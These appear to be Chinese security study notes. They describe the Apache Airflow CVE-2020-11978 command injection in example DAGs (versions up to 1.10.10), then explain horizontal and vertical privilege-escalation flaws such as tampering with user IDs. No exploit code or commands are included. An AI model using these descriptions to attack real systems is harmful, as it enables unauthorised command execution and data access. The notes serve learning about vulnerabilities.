Apache Airflow(CVE-2020-11978)

漏洞简介

Airflow 是一个使用 python 语言编写的 data pipeline 调度和监控工作流的平台。Airflow 是通过 DAG（Directed acyclic graph 有向无环图）来管理任务流程的任务调度工具， 不需要知道业务数据的具体内容，设置任务的依赖关系即可实现任务调度。

Apache Airflow是一款开源的，分布式任务调度框架。在其1.10.10版本及以前的示例DAG中存在一处命令注入漏洞（影响版本Apache Airflow <= 1.10.10），未授权的访问者可以通过这个漏洞在Worker中执行任意命令。

逻辑漏洞

越权漏洞

越权漏洞的成因主要是开发⼈员在对数据进行增、删、改、查询时对客户端请求的数据过分相信，而遗漏了权限的判定。

在实际的代码审计中，这种漏洞往往很难通过⼯具进行自动化监测，因此在实际应用中危害很大。其与未授权访问有⼀定差别。

目前存在着两种越权操作类型，横向越权操作（水平越权）和纵向越权操作（垂直越权）。

⼀般越权漏洞容易出现在权限页面（需要登录的页面）增、删、改、查的的地方。如：改用户的id、用户名就可以获取或修改别⼈的信息。

垂直越权

当用户1对用户2的信息进行修改、删除、访问等操作，若两用户权限不同，即为垂直越权；若两用户权限相同，则为水平越权。
